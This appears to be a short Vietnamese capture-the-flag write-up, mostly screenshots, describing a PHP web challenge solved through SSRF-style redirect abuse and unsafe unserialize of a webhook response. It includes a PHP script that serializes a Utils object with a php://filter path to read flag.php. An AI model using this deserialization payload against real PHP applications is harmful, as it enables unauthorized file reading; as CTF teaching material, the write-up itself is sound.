![image](https://github.com/KMANVK/cookiehanhoan_ss2_ctf/assets/94669750/a0e6a584-ad60-4606-9e34-77119680e3f1)
![image](https://github.com/KMANVK/cookiehanhoan_ss2_ctf/assets/94669750/9a442439-1d23-4563-b8e9-34c753b01795)
![image](https://github.com/KMANVK/cookiehanhoan_ss2_ctf/assets/94669750/239361cd-6eb0-4b92-bb62-e012b01aebfc)
Nếu extract mà host là `localhost` thì code sẽ xử lý như sau
![](https://hackmd.io/_uploads/rktjZQYYn.png)

Lợi dụng để gọi đến `redirect` của `index.php`

![](https://hackmd.io/_uploads/BJSTZmFt2.png)

![](https://hackmd.io/_uploads/HJ89zQFYn.png)

![](https://hackmd.io/_uploads/SJo9fXKYn.png)

Untrusted data sẽ là response ta trả về, khi đó nó được unserialize
![](https://hackmd.io/_uploads/Byjpz7tK2.png)

Thêm vào đó object `Utils` khi `__wakeup` sẽ gọi `$this->_file`

![](https://hackmd.io/_uploads/BJWx77Yt2.png)

Script tạo serialize data:
```php
<?php 
class Utils {
    public $_file = "php://filter/convert.base64-encode/resource=flag.php";
};
echo(serialize(new Utils()));
?>
```
Thay kết quả của script vào response của webhook

![](https://hackmd.io/_uploads/HkuR4mYK3.png)

![](https://hackmd.io/_uploads/Sk3TNQYYn.png)

![](https://hackmd.io/_uploads/S1cJHXFKn.png)

